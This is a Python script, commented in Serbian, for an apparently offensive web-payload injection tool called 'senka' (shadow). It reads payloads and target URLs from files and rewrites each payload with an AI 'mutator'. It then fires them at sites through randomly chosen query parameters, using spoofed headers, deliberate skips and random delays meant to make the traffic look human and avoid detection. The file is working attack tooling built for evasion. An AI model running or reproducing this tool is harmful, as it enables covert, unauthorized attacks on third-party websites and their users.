import sys, os
sys.path.append(os.path.abspath(os.path.dirname(__file__)))
import json
import requests
import random
import time
from urllib.parse import urlencode

from shadow_ai_mutator import generisi_stilizovane
from ponasanje import generisi_header
from logovac import loguj
from stealth import generisi_header as stealth_header, odluka_o_slanju, sačekaj

# Učitavanje payload-a
with open("senka/pisma.json", "r") as f:
    payloads = json.load(f)

# Učitavanje headers-a
headers = generisi_header()

# Dodavanje legitimiteta
try:
    with open("senka/legit_headers.json", "r") as f:
        legit = json.load(f)
    headers.update(legit)
except:
    pass

# Učitavanje meta iz targets.txt
with open("targets.txt", "r") as f:
    mete = [line.strip() for line in f if line.strip()]

# Loop kroz mete i payload-e
for meta in mete:
    if not meta.startswith("http"):
        continue

    headers = stealth_header()
    for payload in payloads:
        if not odluka_o_slanju(payload):
            print("[Stealth] Ovaj payload 'preskačemo' kao da korisnik odustaje.")
            continue
        raw = payload["payload"] if isinstance(payload, dict) else payload
        stilizovan = generisi_stilizovane(raw)[0]
        # Stilizuj payload AI-jem

        # Random parametar
        param = random.choice(["q", "search", "input", "term", "s", "query"])
        url = f"{meta}?{urlencode({param: stilizovan})}"

        # Loguj mutaciju
        with open("mutacije.log", "a") as log_f:
            log_f.write(f"[{meta}] {stilizovan}\n")

        print(f"[Senka šalje pismo] {url}")
        try:
            r = requests.get(url, headers=headers, timeout=8)
            loguj(url, r.status_code, stilizovan)
            print(f"[{r.status_code}] {url} ({len(r.content)} B)")
        except Exception as e:
            print(f"[!] Greška: {e}")

        # Random čekanje da ličimo na čoveka
        time.sleep(random.uniform(7.5, 15.0))
def loguj_uspeh(url, payload):
    with open("senka/uspesni.log", "a") as f:
        f.write(f"[SUCCESS] {url}\nPayload: {payload}\n\n")
def posalji(meta, payload):
    import urllib.parse
    from senka.stealth import generisi_header, odluka_o_slanju, sačekaj
    import requests

    if not odluka_o_slanju(payload):
        print("[Stealth] Ovaj payload 'preskačemo' kao da korisnik odustaje.")
        return

    sačekaj()
    base = meta["url"]
    param = meta["param"]
    vrednost = urllib.parse.quote_plus(payload["payload"])
    url = f"{base}?{param}={vrednost}"

    headers = generisi_header()
    try:
        r = requests.get(url, headers=headers, timeout=7)
        print(f"[✓] Logovano: {url} ({r.status_code})")
        print(f"[{r.status_code}] {url} ({len(r.content)} B)")
        from senka.logovac import loguj
        loguj(url, r.status_code, payload["payload"])
    except Exception as e:
        print(f"[Greška] {e}")
